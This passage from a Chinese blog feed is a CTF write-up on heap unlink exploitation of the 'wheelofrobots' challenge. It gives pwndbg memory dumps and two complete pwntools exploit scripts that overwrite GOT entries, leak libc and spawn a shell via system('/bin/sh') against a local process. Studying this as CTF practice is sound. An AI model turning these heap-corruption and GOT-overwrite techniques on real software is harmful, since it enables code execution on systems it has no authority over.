"</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, qword_6030E8, <span class="number">20</span> * qword_603148);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>我们知道如果在tinny处改size就可以覆盖destruction的内容，构造unlink，先在bss段构造fack_chunk，使原本指向tinny，即chunk1的指针，指向0x603148处，之后对chunk1的所有操作都在这个地址处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x6030e0</span></span><br><span class="line"><span class="number">0x6030e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">0x6030f0:0x00000000010210100x0000000000603148 -&gt;tinny point to 0x603148</span><br><span class="line"><span class="number">0x603100</span>:<span class="number">0x0000000001021030</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:<span class="number">0x0000000100000a31</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:<span class="number">0x0000000100000001</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603130</span>:<span class="number">0x0000000000000003</span><span class="number">0x0000000000000001</span></span><br><span class="line">0x603140:0x0000000000000020 -&gt; fack_chunk0x695420796e6e6954</span><br><span class="line"><span class="number">0x603150</span>:<span class="number">0x000000000000006d</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603160</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603170</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>利用chunk1和chunk6的关系，在chunk6上构造unlink，使unlink到0x6030e8-0x18处，就可以覆写该存放chunk地址为自己想改写的东西。</p><p>wiki具体exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">"./wheelofrobots"</span></span><br><span class="line">robots = ELF(<span class="string">'./wheelofrobots'</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./wheelofrobots"</span>)</span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Robot's name: \n"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_benderinuse</span><span class="params">(inuse)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.send(<span class="string">'9999'</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where, what)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"step 1"</span></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># so it is in fastbin, idx2-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># idx2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment"># overflow bender inuse with 1</span></span><br><span class="line">    overflow_benderinuse(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change bender's fd to 0x603138, point to bender's size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    <span class="comment"># in order add bender again</span></span><br><span class="line">    overflow_benderinuse(<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="comment"># add bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># it is at Robot Devil</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>) <span class="comment">#构造个size，使add tinny的时候指向0x603148，同时把它写进0x3060f8</span></span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 2'</span></span><br><span class="line">    <span class="comment"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># alloc devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment"># edit destructor's size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    <span class="comment"># place fake chunk at destructor's pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk) <span class="comment">#写在heap里</span></span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 3'</span></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">'a'</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 4'</span></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(robots.got[<span class="string">'exit'</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 5'</span></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(robots.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot() <span class="comment">#start chunk1，即puts</span></span><br><span class="line">    p.recvuntil(<span class="string">'New hands great!! Thx '</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">'!\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">'puts addr: '</span> + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(robots.got[<span class="string">'free'</span>], system_addr)</span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>emmm这种方法在start robots那里我就很懵，简便一点的话就换一种方法来leak，直接覆写chunk1和chunk2，通过改free的got表来实现<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">elf = ELF(<span class="string">'./wheelofrobots'</span>)</span><br><span class="line">p = process(<span class="string">"./wheelofrobots"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Robot's name: \n"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_benderinuse</span><span class="params">(inuse)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.send(<span class="string">'9999'</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where, what)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">'\x01'</span>)</span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>) <span class="comment">#60-&gt;0x40</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>) <span class="comment">#140-&gt;0x90</span></span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">1000</span>)) <span class="comment">#改大小方便填写payload</span></span><br><span class="line">target = <span class="number">0x6030e8</span></span><br><span class="line">fd = target<span class="number">-0x18</span></span><br><span class="line">bk = target<span class="number">-0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">0x40</span>)+p64(fd) + p64(bk) +<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">6</span>,pay)</span><br><span class="line">remove(<span class="number">3</span>) <span class="comment">#unlink</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x18</span> +p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">change(<span class="number">6</span>,pay)</span><br><span class="line">pay = p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">change(<span class="number">6</span>,pay)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">change(<span class="number">6</span>,p64(system))</span><br><span class="line">change(<span class="number">1</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br><a href="https://www.jianshu.com/p/b5ce1e4aee6a" target="_blank" rel="noopener">https://www.jianshu.com/p/b5ce1e4aee6a</a><br><a href="https://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">https://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;把ctf wiki里的unlink题简单的做了一下&lt;br&gt;先简单的记录一下，以后吃透了再回来好好的填填坑&lt;/p&gt;
&lt;p&gt;理解了一下unlink的操作&lt;br&gt;就是构造一个chunk，例如&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302000&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000051&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302010&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000040&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#fack_chunk（构造成一个free掉的样子）  0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302020&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x00000000006030d0&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x00000000006030d8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302030&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302040&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x6161616161616161&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302050&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000040&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x00000000000000a0&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#p位改成0，free下一个chunk之后会与上一个chunk合并&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302060&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x654420746f626f52&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x00000000006c6976&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302070&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302080&lt;/span&gt;:	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&quot;number&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;0x1302090&lt;/span&gt;:	&lt;span 